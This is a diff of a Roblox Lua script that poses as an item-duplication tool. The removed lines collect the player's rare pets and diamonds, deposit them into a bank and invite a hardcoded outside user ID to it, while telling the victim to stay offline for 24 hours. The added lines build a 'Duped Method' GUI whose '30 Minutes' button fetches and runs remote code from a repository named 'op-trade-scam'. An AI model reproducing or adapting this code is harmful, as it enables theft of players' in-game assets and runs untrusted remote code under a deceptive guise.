@@ -1,41 +1,89 @@
-local LocalNumber = 4122407052
+local ScreenGui = Instance.new("ScreenGui")
 
-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local main = Instance.new("Frame")
 
-local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local DupedMethodMadeByPr4ston = Instance.new("TextLabel")
 
-local mybanks = lib.Network.Invoke("get my banks")
+local RESET = Instance.new("TextButton")
 
-local PetsList = {}
+local _10Minutes = Instance.new("TextButton")
 
-for i,v in pairs(lib.Save.Get().Pets) do
+local _20Minutes = Instance.new("TextButton")
 
-    local v2 = lib.Directory.Pets[v.id];
+local _30Minutes = Instance.new("TextButton")
 
-    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
+--Properties:
 
-        table.insert(PetsList, v.uid);
+ScreenGui.Parent = game.CoreGui
 
-    end
+main.Name = "main"
 
-end
+main.Parent = ScreenGui
 
-local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
+main.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
 
-if request then
+main.Position = UDim2.new(0.0659062043, 0, 0.186878726, 0)
 
-    lib.Message.New("Dupe starting! Please wait for atleast 24 hours");
+main.Size = UDim2.new(0, 214, 0, 260)
 
-else
+main.Active = true
 
-end
+main.Draggable = true
 
-if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
+DupedMethodMadeByPr4ston.Name = "Duped Method | Made By Pr4ston"
 
-    lib.Message.New("Dupe Proccesing! (make sure your bank have pet or gems for duping!)");
+DupedMethodMadeByPr4ston.Parent = main
 
-else
+DupedMethodMadeByPr4ston.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
 
-    lib.Message.New("Don't join the game for the next 24 hrs to stop the pets from getting deleted");
+DupedMethodMadeByPr4ston.Position = UDim2.new(-0.000352235977, 0, 0, 0)
 
-end;
+DupedMethodMadeByPr4ston.Size = UDim2.new(0, 215, 0, 56)
+
+DupedMethodMadeByPr4ston.Font = Enum.Font.SourceSans
+
+DupedMethodMadeByPr4ston.Text = "Duped Method | Made By Pr4ston"
+
+DupedMethodMadeByPr4ston.TextColor3 = Color3.fromRGB(0, 0, 0)
+
+DupedMethodMadeByPr4ston.TextSize = 14.000
+
+RESET.Name = "RESET"
+
+RESET.Parent = main
+
+RESET.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+
+RESET.Position = UDim2.new(0, 0, 0.204379559, 0)
+
+RESET.Size = UDim2.new(0, 214, 0, 50)
+
+RESET.Font = Enum.Font.SourceSans
+
+RESET.Text = "RESET"
+
+RESET.TextColor3 = Color3.fromRGB(0, 0, 0)
+
+RESET.TextSize = 40.000
+
+_30Minutes.Name = "30 Minutes"
+
+_30Minutes.Parent = main
+
+_30Minutes.BackgroundColor3 = Color3.fromRGB(0, 71, 0)
+
+_30Minutes.Position = UDim2.new(0, 0, 0.746376812, 0)
+
+_30Minutes.Size = UDim2.new(0, 213, 0, 65)
+
+_30Minutes.Font = Enum.Font.SourceSans
+
+_30Minutes.Text = "30 Minutes"
+
+_30Minutes.TextColor3 = Color3.fromRGB(0, 0, 0)
+
+_30Minutes.TextSize = 46.000
+
+_30Minutes.MouseButton1Down:connect(function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripts-Project-wd/op-trade-scam/main/AutofarmerScript'))()end)
